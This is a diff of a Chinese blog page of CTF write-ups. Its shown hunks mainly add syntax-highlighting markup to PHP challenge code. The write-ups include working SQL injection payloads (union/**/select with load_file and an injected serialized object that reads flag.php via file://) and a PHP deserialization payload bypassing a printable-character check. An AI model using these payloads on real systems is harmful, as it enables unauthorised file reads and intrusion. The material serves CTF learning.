@@ -880,14 +880,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        11.7k
+                        10.9k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        53 分
+                        50 分
                     </div>
                     
                 
@@ -1809,7 +1809,7 @@ class IndexAction extends Action{
 <p>2.php反序列化</p>
 <p>登陆后有三栏，username，age，blog，查看源代码：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8824%E6%97%A50928_1.png" alt></p>
-<p>发现这里用data://伪协议会输出一些东西，那么肯定就是flag</p>
+<p>发现这里用data://伪协议会输出一些东西，可以是flag</p>
 <p>又因为此页面存在sql注入点，sqlmap跑不动，也可能是我不会使。。。</p>
 <p>可以用sqlfuzz小字典跑一下，但是我有wp我就不跑了。。。</p>
 <p>payload如下：</p>
@@ -1836,167 +1836,173 @@ union/**/select
 <p>也就是说data可以传入反序列化，有序列化就会有源码，备份字典跑一下，得到robots.txt：</p>
 <p>User-agent: *<br>Disallow: /user.php.bak</p>
 <p>user.php内容：<a href="https://blog.csdn.net/qq_43622442/article/details/105633194" target="_blank" rel="noopener">这篇文章对该序列化进行了很好的解释</a></p>
-<pre><code>&lt;?php
-class UserInfo
-{
-    public $name = &quot;&quot;;
-    public $age = 0;
-    public $blog = &quot;&quot;;
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
 
-    public function __construct($name, $age, $blog)
-    {
-        $this-&gt;name = $name;
-        $this-&gt;age = (int)$age;
-        $this-&gt;blog = $blog;
-    }
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    function get($url)
-    {
-        # curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。
-        $ch = curl_init();
+    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token shell-comment comment"># curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。</span>
+        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        # curl_setopt ： 请求一个url。其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。
-        curl_setopt($ch, CURLOPT_URL, $url);
+        <span class="token shell-comment comment"># curl_setopt ： 请求一个url。其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</span>
+        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-          # CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+          <span class="token shell-comment comment"># CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</span>
+        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-           # curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。
-        $output = curl_exec($ch);
+           <span class="token shell-comment comment"># curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。</span>
+        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        # CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        <span class="token shell-comment comment"># CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</span>
+        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        #如果状态码不是404，就返回exec的结果。
-        if($httpCode == 404) {
-            return 404;
-        }
-        curl_close($ch);
+        <span class="token shell-comment comment">#如果状态码不是404，就返回exec的结果。</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        return $output;
-    }
+        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    public function getBlogContents ()
-    {
-        return $this-&gt;get($this-&gt;blog);
-    }
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    public function isValidBlog ()
-    {
-        $blog = $this-&gt;blog;
-        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
-    }
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-}</code></pre><p>本地序列化：</p>
-<pre><code>&lt;?php
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>本地序列化：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
 
-class UserInfo
-{
-    public $name = &quot;test&quot;;
-    public $age = 123;
-    public $blog = &quot;file:///var/www/html/flag.php&quot;;#访问请求一下判断是否存在
-}
-$a = new UserInfo();
-echo serialize($a);
-?&gt;</code></pre><p>得到：O:8:”UserInfo”:3:{s:4:”name”;s:4:”test”;s:3:”age”;i:123;s:4:”blog”;s:22:”file:///var/www/html/flag.php”;}</p>
+<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";#访问请求一下判断是否存在</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到：O:8:”UserInfo”:3:{s:4:”name”;s:4:”test”;s:3:”age”;i:123;s:4:”blog”;s:22:”file:///var/www/html/flag.php”;}</p>
 <p>利用注入将数据传入进去：</p>
-<pre><code>?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;#</code></pre><p>f12可以之间看见，右键源代码则需要base64再解密</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>no<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> union<span class="token comment" spellcheck="true">/**/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>'O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span>"UserInfo"<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>"name"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>"test"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span>"age"<span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">123</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>"blog"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span>"file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";}'#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>f12可以之间看见，右键源代码则需要base64再解密</p>
 <p>解法二：利用没被过滤的函数load_file()</p>
 <p>payload:</p>
-<pre><code>?no=-1 union/**/select 1,load_file(&#39;/var/www/html/flag.php&#39;),3,4</code></pre><h1 id="2021-4-25"><a href="#2021-4-25" class="headerlink" title="2021-4-25"></a>2021-4-25</h1><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>先扫盲：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>no<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> union<span class="token comment" spellcheck="true">/**/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="2021-4-25"><a href="#2021-4-25" class="headerlink" title="2021-4-25"></a>2021-4-25</h1><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>先扫盲：</p>
 <p><a href="https://www.w3school.com.cn/php/func_string_ord.asp" target="_blank" rel="noopener">PHP ord() 函数</a>其返回值为ASCII码</p>
 <p>file_put_contents() 函数把一个字符串写入文件中，如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p>
 <p>=== 需要值和其所属的类型都符合要求 ‘2’ === 2 false</p>
 <p>== 值符合要求即可 ‘2’ == 2 true</p>
 <p>题目：</p>
-<pre><code>&lt;?php
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
-include(&quot;flag.php&quot;);
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-highlight_file(__FILE__);
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-class FileHandler {
+<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>
 
-    protected $op;
-    protected $filename;
-    protected $content;
+    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
 
-    function __construct() {
-        $op = &quot;1&quot;;
-        $filename = &quot;/tmp/tmpfile&quot;;
-        $content = &quot;Hello World!&quot;;
-        $this-&gt;process();
-    }
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
+        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
+        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    public function process() {
-        if($this-&gt;op == &quot;1&quot;) {
-            $this-&gt;write();
-        } else if($this-&gt;op == &quot;2&quot;) {
-            $res = $this-&gt;read();
-            $this-&gt;output($res);
-        } else {
-            $this-&gt;output(&quot;Bad Hacker!&quot;);
-        }
-    }
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
 
-    private function write() {
-        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
-            if(strlen((string)$this-&gt;content) &gt; 100) {
-                $this-&gt;output(&quot;Too long!&quot;);
-                die();
-            }
-            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
-            if($res) $this-&gt;output(&quot;Successful!&quot;);
-            else $this-&gt;output(&quot;Failed!&quot;);
-        } else {
-            $this-&gt;output(&quot;Failed!&quot;);
-        }
-    }
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
 
-    private function read() {
-        $res = &quot;&quot;;
-        if(isset($this-&gt;filename)) {
-            $res = file_get_contents($this-&gt;filename);
-        }
-        return $res;
-    }
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    private function output($s) {
-        echo &quot;[Result]: &lt;br&gt;&quot;;
-        echo $s;
-    }
+    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    function __destruct() {
-        if($this-&gt;op === &quot;2&quot;)
-            $this-&gt;op = &quot;1&quot;;
-        $this-&gt;content = &quot;&quot;;
-        $this-&gt;process();
-    }
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-}
+<span class="token punctuation">}</span>
 
-function is_valid($s) {
-    for($i = 0; $i &lt; strlen($s); $i++)
-        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
-            return false;
-    return true;
-}
+<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
-if(isset($_GET{&#39;str&#39;})) {
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 
-    $str = (string)$_GET[&#39;str&#39;];
-    if(is_valid($str)) {
-        $obj = unserialize($str);
-    }
+    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-}</code></pre><p>首先，这里面在传入反序列化后的参数会被调用到的函数只有</p>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先，这里面在传入反序列化后的参数会被调用到的函数只有</p>
 <p>__construct()：当一个对象创建时被调用</p>
 <p>__destruct()：当一个对象销毁时被调用</p>
 <h3 id="1-绕过is-valid-函数"><a href="#1-绕过is-valid-函数" class="headerlink" title="1.绕过is_valid()函数"></a>1.绕过is_valid()函数</h3><p>函数is_valid($s)对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true，也就是这里：</p>
-<pre><code>if(is_valid($str)) {
-        $obj = unserialize($str);
-    }</code></pre><p>绕过方法：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>绕过方法：</p>
 <p>针对与protected类型和private类型的属性存在不可打印字符：</p>
 <p>protect分析：</p>
 <pre><code>本来是sex结果上面出现的是*sex，而且*sex的长度是4，但是上面显示的是6，
@@ -2010,102 +2016,108 @@ if(isset($_GET{&#39;str&#39;})) {
 <pre><code>O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:7:&quot;oavinci&quot;;}</code></pre><p>只要将代表字符串个数的的s改为大写S，就可以实现将%00用16进制编码表示，变成00</p>
 <h3 id="2-利用-destruct-来实现read-方法的调用"><a href="#2-利用-destruct-来实现read-方法的调用" class="headerlink" title="2.利用__destruct()来实现read()方法的调用"></a>2.利用__destruct()来实现read()方法的调用</h3><p>问题1：为什么非要调用read()方法</p>
